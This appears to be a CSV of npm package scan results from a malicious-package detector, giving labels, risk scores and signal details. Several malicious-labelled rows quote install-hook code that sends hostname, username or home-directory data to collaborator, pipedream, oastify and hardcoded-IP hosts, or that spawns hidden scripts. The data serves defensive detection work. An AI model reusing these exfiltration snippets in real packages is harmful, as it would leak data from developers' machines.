package_name,version,label,timestamp,routing,risk_score,confidence,primary_category,confirmed_count,supporting_count,noise_filtered,layer1_count,layer2_count,sources_analyzed,has_js_source,confirmed_signals_json,supporting_signals_json
com.google.play,1.0.0,malicious,2026-03-23T22:47:33.888147,flag,0.7773,0.835,data_exfiltration,2,0,0,2,0,entry_point,True,"[""Signal  : Known webhook/exfiltration collector domain in install hook\nLocation: package.json \u2192 scripts.preinstall\nCode    : export HOSTNAME && BCNET=\""linux-com.google.play-h-$HOSTNAME-u-$USER.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net\"""", ""Signal  : Curl External Url in install hook\nLocation: package.json \u2192 scripts.preinstall\nCode    : export HOSTNAME && BCNET=\""linux-com.google.play-h-$HOSTNAME-u-$USER.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net\""""]",[]
com.unity.ai.navigation.components,1.0.6,malicious,2026-03-23T22:47:33.891047,review,0.336,0.72,suspicious_behavior,1,0,0,1,0,none,False,"[""Signal  : Package contains no JavaScript files (install hook present \u2014 payload may be remote)\nLocation: package file_structure\nCode    : 1 file(s): ['package.json']""]",[]
com.unity.ai.navigation.components,1.1.1-exp.2,malicious,2026-03-23T22:47:33.893047,review,0.336,0.72,suspicious_behavior,1,0,0,1,0,none,False,"[""Signal  : Package contains no JavaScript files (install hook present \u2014 payload may be remote)\nLocation: package file_structure\nCode    : 1 file(s): ['package.json']""]",[]
commander-js,2.19.84,malicious,2026-03-23T22:47:33.982648,flag,0.7933,0.85,local_code_execution,2,0,2,1,3,"setup.js,entry_point",True,"[""Signal  : Child Process Exec\nLocation: setup.js:1\nCode    : (function(){ require('child_process').spawn('BUILD_ID=.temp-build nohup node update.js >/dev/null 2>&1 &', { stdio: 'inh..."", ""Signal  : child_process.spawn() with dynamic argument\nLocation: setup.js:1\nCode    : require('child_process').spawn('BUILD_ID=.temp-build nohup node update.js >/dev/null 2>&1 &', { stdio: 'inherit', shell: true })""]",[]
commerce-clients,999.9.9,malicious,2026-03-23T22:47:34.001500,flag,0.77,0.825,dynamic_code_execution,2,0,0,2,0,"install.js,entry_point",True,"[""Signal  : Eval In Install File\nLocation: install.js:1\nCode    : const e=require(\""crypto\""),r=\""aes-256-ctr\"",t=String.fromCharCode(86)+\""kYp3s6v9y$B&E)H@MbQeThWmZq4t7w!\"",o=o=>{const c=e.cr..."", ""Signal  : Version contains inflated segment(s) [999] \u2014 possible dependency confusion or squatting attempt\nLocation: package.json \u2192 version\nCode    : 999.9.9""]",[]
commerce-sdk-react,2.4.1-dev,malicious,2026-03-23T22:47:34.016296,review,0.39,0.65,none,0,3,0,1,2,"index.js,entry_point",True,[],"[""Signal  : Filesystem Write In Install\nLocation: index.js:34\nCode    : fs.writeFile('ByKotko.txt', 'this proof for report', function (err) {"", ""Signal  : Non-standard URL in function call: https://kotko.org/?${company}:${packages}=${buff}\nLocation: index.js:41\nCode    : request(`https://kotko.org/?${company}:${packages}=${buff}`, (error, response, body) => {})"", ""Signal  : Non-standard URL in function call: https://kotko.org/?${company}:${packages}=${buff}\nLocation: entry_point:41\nCode    : request(`https://kotko.org/?${company}:${packages}=${buff}`, (error, response, body) => {})""]"
common-web-frontend-styling,9.9.9,malicious,2026-03-23T22:47:34.021701,review,0.364,0.78,network_exfiltration,1,0,0,1,0,./.pbk.js,True,"[""Signal  : Network Request In Install\nLocation: ./.pbk.js:2\nCode    : const https = require('https');""]",[]
common-web-frontend-styling,9.99.999,malicious,2026-03-23T22:47:34.030724,review,0.494,0.715,network_exfiltration,1,1,0,2,0,./.pbk.js,True,"[""Signal  : Network Request In Install\nLocation: ./.pbk.js:2\nCode    : const https = require('https');""]","[""Signal  : Version contains inflated segment(s) [999] \u2014 possible dependency confusion or squatting attempt\nLocation: package.json \u2192 version\nCode    : 9.99.999""]"
compositionupdate,88.8.8,malicious,2026-03-23T22:47:34.045409,flag,1.0,0.7933,data_exfiltration,2,1,0,3,0,"index.js,entry_point",True,"[""Signal  : Known webhook/exfiltration collector domain\nLocation: index.js:25\nCode    : hostname: \""oiaqaquemkde49kzmhr5ot4uhlnbb0.burpcollaborator.net\"", //replace burpcollaborator.net with Interactsh or piped"", ""Signal  : Network Request In Install\nLocation: index.js:4\nCode    : const https = require(\""https\"");""]","[""Signal  : Filesystem Write In Install\nLocation: index.js:11\nCode    : hd: os.homedir(),""]"
conflicting_modules,1.0.0,malicious,2026-03-23T22:47:34.058966,flag,1.0,0.7933,data_exfiltration,2,1,0,3,0,"index.js,entry_point",True,"[""Signal  : Known webhook/exfiltration collector domain\nLocation: index.js:25\nCode    : hostname: \""ztw2mbassru9btmbquidmgnxyo4es3.burpcollaborator.net\"","", ""Signal  : Network Request In Install\nLocation: index.js:4\nCode    : const https = require(\""https\"");""]","[""Signal  : Filesystem Write In Install\nLocation: index.js:11\nCode    : hd: os.homedir(),""]"
@grubhubprod/cookbook,9999.9999.2,malicious,2026-03-23T22:47:34.068755,flag,1.0,0.846,network_exfiltration,5,0,0,3,2,"index.js,entry_point",True,"[""Signal  : Known webhook/exfiltration collector domain\nLocation: index.js:7\nCode    : headers : { host : 'b7ead99d376f5e70bc778e1724417cbe.m.pipedream.net',"", ""Signal  : Network Request In Install\nLocation: index.js:1\nCode    : const http = require('https');"", ""Signal  : Version contains inflated segment(s) [9999, 9999] \u2014 possible dependency confusion or squatting attempt\nLocation: package.json \u2192 version\nCode    : 9999.9999.2"", ""Signal  : Hardcoded external IP(s) in function call: 44.196.248.120\nLocation: index.js:3\nCode    : http.request({   host: '44.196.248.120',   path: '/',   method: 'POST',   headers : { host : 'b7ead99d376f5e70bc778e1724417cbe.m.pipedream.n..."", ""Signal  : Hardcoded external IP(s) in function call: 44.196.248.120\nLocation: entry_point:3\nCode    : http.request({   host: '44.196.248.120',   path: '/',   method: 'POST',   headers : { host : 'b7ead99d376f5e70bc778e1724417cbe.m.pipedream.n...""]",[]
copy-webpack-plugin-v6,6.0.0,malicious,2026-03-23T22:47:34.071239,review,0.336,0.72,suspicious_behavior,1,0,0,1,0,none,False,"[""Signal  : Package contains no JavaScript files (install hook present \u2014 payload may be remote)\nLocation: package file_structure\nCode    : 2 file(s): ['package.json', 'pre.sh']""]",[]
core-argos-litelement-artifact,1.0.0,malicious,2026-03-23T22:47:34.071239,skip,0.144,0.72,network_exfiltration,1,0,0,1,0,entry_point,True,"[""Signal  : Curl External Url in install hook\nLocation: package.json \u2192 scripts.preinstall\nCode    : curl http://nb231buz8dxj3zn4fix0o88tzk5atz.oastify.com""]",[]
createtile,99.0.0,malicious,2026-03-23T22:47:34.077688,flag,0.7773,0.835,data_exfiltration,2,0,0,2,0,entry_point,True,"[""Signal  : Known webhook/exfiltration collector domain in install hook\nLocation: package.json \u2192 scripts.preinstall\nCode    : export HOSTNAME && BCNET=\""linux-createtile-h-$HOSTNAME-u-$USER.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net\""; sle"", ""Signal  : Curl External Url in install hook\nLocation: package.json \u2192 scripts.preinstall\nCode    : export HOSTNAME && BCNET=\""linux-createtile-h-$HOSTNAME-u-$USER.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net\""; sle""]",[]
cron-guru,1.0.2,malicious,2026-03-23T22:47:34.091146,review,0.42,0.9,obfuscation,1,0,1,0,2,entry_point,True,"[""Signal  : Obfuscator tool signature (_0x pattern, 59 occurrences)\nLocation: entry_point:10\nCode    : function _0x2775(_0x2cb828,_0x45dfca){const _0x18d2e4=_0x18d2();return _0x2775=function(_0x277535,_0x5e9d3f){_0x277535=_""]",[]
crypto-standarts,4.1.2,malicious,2026-03-23T22:47:34.104438,skip,0.0,0.2,none,0,0,1,0,1,entry_point,True,[],[]
cryptotickets,99.99.99,malicious,2026-03-23T22:47:34.119549,flag,1.0,0.7933,data_exfiltration,2,1,0,3,0,"index.js,entry_point",True,"[""Signal  : Known webhook/exfiltration collector domain\nLocation: index.js:25\nCode    : hostname: \""w1yg57i1m385uznyrs3yls1phgn6bv.burpcollaborator.net\"", //replace burpcollaborator.net with Interactsh or piped"", ""Signal  : Network Request In Install\nLocation: index.js:4\nCode    : const https = require(\""https\"");""]","[""Signal  : Filesystem Write In Install\nLocation: index.js:11\nCode    : hd: os.homedir(),""]"
cs_kid,2.1.0,malicious,2026-03-23T22:47:34.120287,flag,0.9693,0.835,network_exfiltration,2,0,0,2,0,none,False,"[""Signal  : Hardcoded external IP address '185.215.180.56'\nLocation: package.json \u2192 scripts.preinstall\nCode    : curl 185.215.180.56:9012"", ""Signal  : Package contains no JavaScript files (install hook present \u2014 payload may be remote)\nLocation: package file_structure\nCode    : 1 file(s): ['package.json']""]",[]
cs_kid,3.1.0,malicious,2026-03-23T22:47:34.126001,flag,0.9693,0.835,network_exfiltration,2,0,0,2,0,none,False,"[""Signal  : Hardcoded external IP address '185.215.180.56'\nLocation: package.json \u2192 scripts.preinstall\nCode    : curl `whoami`.185.215.180.56:9012"", ""Signal  : Package contains no JavaScript files (install hook present \u2014 payload may be remote)\nLocation: package file_structure\nCode    : 1 file(s): ['package.json']""]",[]
@actions/core,1.10.1,benign,2026-03-23T22:47:34.162931,skip,0.0,0.2,none,0,0,1,0,1,entry_point,True,[],[]
@alifd/next,1.26.24,benign,2026-03-23T22:47:34.166590,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
@ampproject/remapping,2.2.1,benign,2026-03-23T22:47:34.220326,skip,0.0,0.2,none,0,0,1,0,1,entry_point,True,[],[]
@angular-devkit/core,16.2.3,benign,2026-03-23T22:47:34.233332,skip,0.0,0.2,none,0,0,1,0,1,entry_point,True,[],[]
@ant-design/icons,5.2.6,benign,2026-03-23T22:47:34.241124,skip,0.0,0.2,none,0,0,1,0,1,entry_point,True,[],[]
@apidevtools/json-schema-ref-parser,11.1.0,benign,2026-03-23T22:47:34.267443,skip,0.0,0.2,none,0,0,1,0,1,entry_point,True,[],[]
@apollo/client,3.8.4,benign,2026-03-23T22:47:34.284116,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
@assemblyscript/loader,0.27.9,benign,2026-03-23T22:47:34.373355,skip,0.0,0.2,none,0,0,1,0,1,entry_point,True,[],[]
@aws-cdk/aws-ec2,1.204.0,benign,2026-03-23T22:47:34.388692,skip,0.0,0.2,none,0,0,1,0,1,entry_point,True,[],[]
@aws-sdk/credential-provider-sso,3.418.0,benign,2026-03-23T22:47:34.392961,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
@aws-sdk/credential-provider-web-identity,3.418.0,benign,2026-03-23T22:47:34.397891,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
@aws-sdk/credential-providers,3.418.0,benign,2026-03-23T22:47:34.401470,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
@aws-sdk/eventstream-serde-browser,3.374.0,benign,2026-03-23T22:47:34.407534,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
@azure/abort-controller,1.1.0,benign,2026-03-23T22:47:34.421743,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
@babel/helper-skip-transparent-expression-wrappers,7.22.5,benign,2026-03-23T22:47:34.427769,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
@babel/helper-split-export-declaration,7.22.6,benign,2026-03-23T22:47:34.440034,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
@babel/helper-string-parser,7.22.5,benign,2026-03-23T22:47:34.466266,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
@babel/helper-validator-identifier,7.22.20,benign,2026-03-23T22:47:34.482028,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
@babel/helper-validator-option,7.22.15,benign,2026-03-23T22:47:34.489769,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
@babel/helper-wrap-function,7.22.20,benign,2026-03-23T22:47:34.505136,skip,0.0,0.2,none,0,0,1,0,1,entry_point,True,[],[]
@emotion/weak-memoize,0.3.1,benign,2026-03-23T22:47:34.510071,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
@ethersproject/address,5.7.0,benign,2026-03-23T22:47:34.534507,skip,0.0,0.2,none,0,0,1,0,1,entry_point,True,[],[]
@ethersproject/constants,5.7.0,benign,2026-03-23T22:47:34.544799,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
@ethersproject/networks,5.7.1,benign,2026-03-23T22:47:34.574063,skip,0.13,0.65,none,0,1,0,0,1,entry_point,True,[],"[""Signal  : Non-standard URL in function call: https://www.ethercluster.com/mordor\nLocation: entry_point:112\nCode    : etcDefaultProvider(\""https://www.ethercluster.com/mordor\"", \""classicMordor\"")""]"
@ethersproject/properties,5.7.0,benign,2026-03-23T22:47:34.616653,skip,0.0,0.2,none,0,0,1,0,1,entry_point,True,[],[]
@ethersproject/solidity,5.7.0,benign,2026-03-23T22:47:34.635381,skip,0.0,0.2,none,0,0,1,0,1,entry_point,True,[],[]
@ffmpeg-installer/ffmpeg,1.1.0,benign,2026-03-23T22:47:34.643717,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
@formatjs/icu-messageformat-parser,2.6.2,benign,2026-03-23T22:47:34.659007,skip,0.0,0.2,none,0,0,1,0,1,entry_point,True,[],[]
@formatjs/intl-localematcher,0.4.2,benign,2026-03-23T22:47:34.668866,skip,0.0,0.2,none,0,0,1,0,1,entry_point,True,[],[]
@google-cloud/paginator,5.0.0,benign,2026-03-23T22:47:34.689235,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
@google-cloud/promisify,4.0.0,benign,2026-03-23T22:47:34.710981,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
@jest/create-cache-key-function,29.7.0,benign,2026-03-23T22:47:34.723433,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
@jest/environment,29.7.0,benign,2026-03-23T22:47:34.726099,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
@jest/expect,29.7.0,benign,2026-03-23T22:47:34.731151,skip,0.15,0.75,supply_chain_attack,1,0,0,1,0,entry_point,True,"[""Signal  : Scoped package depends on identically-named public package\nLocation: package.json \u2192 dependencies\nCode    : '@jest/expect' depends on 'expect' @ '^29.7.0'""]",[]
@jest/globals,29.7.0,benign,2026-03-23T22:47:34.731151,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
@jest/source-map,29.6.3,benign,2026-03-23T22:47:34.739659,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
@jest/test-result,29.7.0,benign,2026-03-23T22:47:34.744433,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
@jest/test-sequencer,29.7.0,benign,2026-03-23T22:47:34.776591,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
@mui/types,7.2.4,benign,2026-03-23T22:47:34.780594,skip,0.0,0.2,none,0,1,0,1,0,none,False,[],"[""Signal  : Package contains no JavaScript files\nLocation: package file_structure\nCode    : 5 file(s): ['LICENSE', 'OverridableComponentAugmentation.ts', 'README.md', 'index.d.ts', 'package.json']""]"
@oclif/plugin-help,5.2.19,benign,2026-03-23T22:47:34.782313,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
@octokit/auth-token,4.0.0,benign,2026-03-23T22:47:34.794915,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
@protobufjs/float,1.0.2,benign,2026-03-23T22:47:34.860694,skip,0.0,0.2,none,0,0,1,0,1,entry_point,True,[],[]
@sinonjs/fake-timers,11.1.0,benign,2026-03-23T22:47:35.067033,skip,0.0,0.2,none,0,0,1,0,1,entry_point,True,[],[]
@storybook/store,7.4.4,benign,2026-03-23T22:47:35.077095,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
@svgr/babel-plugin-remove-jsx-attribute,8.0.0,benign,2026-03-23T22:47:35.083896,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
@swc/helpers,0.5.2,benign,2026-03-23T22:47:35.117335,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
@trysound/sax,0.2.0,benign,2026-03-23T22:47:35.333060,skip,0.0,0.2,none,0,0,1,0,1,entry_point,True,[],[]
@tsconfig/node10,1.0.9,benign,2026-03-23T22:47:35.336060,skip,0.0,0.2,none,0,1,0,1,0,none,False,[],"[""Signal  : Package contains no JavaScript files\nLocation: package file_structure\nCode    : 4 file(s): ['LICENSE', 'README.md', 'package.json', 'tsconfig.json']""]"
glob-parent,6.0.2,benign,2026-03-23T22:47:35.345385,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
glob-promise,6.0.5,benign,2026-03-23T22:47:35.356484,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
glob-to-regexp,0.4.1,benign,2026-03-23T22:47:35.380690,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
glob-watcher,6.0.0,benign,2026-03-23T22:47:35.391956,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
globalyzer,0.1.4,benign,2026-03-23T22:47:35.409219,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
globby,13.2.2,benign,2026-03-23T22:47:35.433443,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
globrex,0.1.2,benign,2026-03-23T22:47:35.464574,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
glslify,7.1.1,benign,2026-03-23T22:47:35.501513,skip,0.0,0.2,none,0,0,1,0,1,entry_point,True,[],[]
gm,1.25.0,benign,2026-03-23T22:47:35.520605,skip,0.0,0.2,none,0,0,1,0,1,entry_point,True,[],[]
grunt-contrib-clean,2.0.1,benign,2026-03-23T22:47:35.537800,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
gzip-size,7.0.0,benign,2026-03-23T22:47:35.549745,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
hammerjs,2.0.8,benign,2026-03-23T22:47:35.836844,skip,0.0,0.2,none,0,0,1,0,1,entry_point,True,[],[]
handlebars-loader,1.7.3,benign,2026-03-23T22:47:35.905021,skip,0.0,0.2,none,0,0,1,0,1,entry_point,True,[],[]
har-schema,2.0.0,benign,2026-03-23T22:47:35.905021,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
hard-source-webpack-plugin,0.13.1,benign,2026-03-23T22:47:35.984768,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
has-bigints,1.0.2,benign,2026-03-23T22:47:35.988784,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
has-unicode,2.0.1,benign,2026-03-23T22:47:35.992957,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
hash.js,1.1.7,benign,2026-03-23T22:47:35.997831,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
hasha,5.2.2,benign,2026-03-23T22:47:36.017909,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
hashids,2.3.0,benign,2026-03-23T22:47:36.021135,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
hashish,0.0.4,benign,2026-03-23T22:47:36.060831,skip,0.0,0.2,none,0,0,1,0,1,entry_point,True,[],[]
hastscript,8.0.0,benign,2026-03-23T22:47:36.064329,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
html-tags,3.3.1,benign,2026-03-23T22:47:36.066575,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
html-to-react,1.6.0,benign,2026-03-23T22:47:36.070451,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
htmlparser2,9.0.0,benign,2026-03-23T22:47:36.087817,skip,0.0,0.2,none,0,0,1,0,1,entry_point,True,[],[]
human-signals,5.0.0,benign,2026-03-23T22:47:36.101224,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
humanize-ms,1.2.1,benign,2026-03-23T22:47:36.105800,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
humps,2.0.1,benign,2026-03-23T22:47:36.122393,skip,0.0,0.2,none,0,0,1,0,1,entry_point,True,[],[]
imports-loader,4.0.1,benign,2026-03-23T22:47:36.130843,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
imurmurhash,0.1.4,benign,2026-03-23T22:47:36.146339,skip,0.0,0.2,none,0,0,1,0,1,entry_point,True,[],[]
indent-string,5.0.0,benign,2026-03-23T22:47:36.158141,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
inferno,8.2.2,benign,2026-03-23T22:47:36.162010,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
io-ts,2.2.20,benign,2026-03-23T22:47:36.432765,skip,0.0,0.2,none,0,0,1,0,1,entry_point,True,[],[]
ionicons,7.1.2,benign,2026-03-23T22:47:36.435978,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
ioredis,5.3.2,benign,2026-03-23T22:47:36.447896,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
ip,2.0.0,benign,2026-03-23T22:47:36.450898,skip,0.0,0.2,none,0,0,0,0,0,none,False,[],[]
ip-address,8.1.0,benign,2026-03-23T22:47:36.462009,skip,0.0,0.2,none,0,0,1,0,1,entry_point,True,[],[]
ip-regex,5.0.0,benign,2026-03-23T22:47:36.471440,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
ipaddr.js,2.1.0,benign,2026-03-23T22:47:36.665702,skip,0.0,0.2,none,0,0,1,0,1,entry_point,True,[],[]
is,3.3.0,benign,2026-03-23T22:47:36.710912,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
is-absolute-url,4.0.1,benign,2026-03-23T22:47:36.715498,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
is-accessor-descriptor,3.0.2,benign,2026-03-23T22:47:36.725156,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
is-alphabetical,2.0.1,benign,2026-03-23T22:47:36.729729,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
is-alphanumerical,2.0.1,benign,2026-03-23T22:47:36.734186,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
is-arguments,1.1.1,benign,2026-03-23T22:47:36.741252,skip,0.0,0.2,none,0,0,1,0,1,entry_point,True,[],[]
javascript-stringify,2.1.0,benign,2026-03-23T22:47:36.759696,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
jayson,4.1.0,benign,2026-03-23T22:47:36.763366,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
jest,29.7.0,benign,2026-03-23T22:47:36.766590,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
jest-canvas-mock,2.5.2,benign,2026-03-23T22:47:36.775553,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
jest-changed-files,29.7.0,benign,2026-03-23T22:47:36.789138,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
jest-circus,29.7.0,benign,2026-03-23T22:47:36.818971,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
jest-cli,29.7.0,benign,2026-03-23T22:47:36.819501,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
jest-config,29.7.0,benign,2026-03-23T22:47:36.882261,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
jest-diff,29.7.0,benign,2026-03-23T22:47:36.909144,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
jest-docblock,29.7.0,benign,2026-03-23T22:47:36.930160,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
jest-each,29.7.0,benign,2026-03-23T22:47:36.948688,skip,0.0,0.2,none,0,0,0,0,0,entry_point,True,[],[]
